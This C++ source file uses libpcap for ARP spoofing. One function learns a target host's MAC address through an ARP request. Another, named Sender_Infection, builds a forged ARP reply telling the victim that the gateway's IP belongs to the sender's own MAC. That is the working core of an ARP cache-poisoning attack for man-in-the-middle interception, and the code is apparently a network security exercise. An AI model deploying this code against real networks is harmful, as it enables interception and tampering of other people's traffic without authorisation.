#include "SenderUtil.h"



Mac getSenderMac(pcap_t* handle, Mac myMac, Ip myIP, Ip senderIp) {
    EthArpPacket packet;
    packet.eth_.dmac_ = Mac(Mac::broadcastMac());
    packet.eth_.smac_ = myMac;
    packet.eth_.type_ = htons(EthHdr::Arp);
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = myMac;
    packet.arp_.sip_ = htonl(myIP);
    packet.arp_.tmac_ = Mac(Mac::nullMac());
    packet.arp_.tip_ = htonl(senderIp);

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    const u_char* pkt;
    struct pcap_pkthdr* header;
    struct EthHdr* Ethernet;
    struct ArpHdr* Arp;

    Mac senderMac;
    while (true) {
        int res = pcap_next_ex(handle, &header, &pkt);
        if (res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }
        Ethernet = (struct EthHdr *)(pkt);
        Arp = (struct ArpHdr *)(pkt + sizeof(EthHdr));
        if (ntohs(Ethernet->type_) == EthHdr::Arp && ntohs(Arp->op_) == ArpHdr::Reply && ntohl(Arp->sip_) == senderIp) {
            senderMac = Arp->smac_;
	    printf("Get Sender Mac!\n");
            break;
        }
    }

    return senderMac;
}



EthArpPacket Sender_Infection(const char *interfaceName,Mac my_mac,Mac SenderMac, Ip sip,Ip tip) {
    
    EthArpPacket packet;
    
    packet.eth_.dmac_ = SenderMac; //Sender MAC
    packet.eth_.smac_ = my_mac; //내 MAC
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = my_mac; //내 MAC
    packet.arp_.sip_ = htonl(tip); //gateway ip , Input
    packet.arp_.tmac_ = SenderMac; //sender MAC
    packet.arp_.tip_ = htonl(sip); //sender IP

    return packet;
}
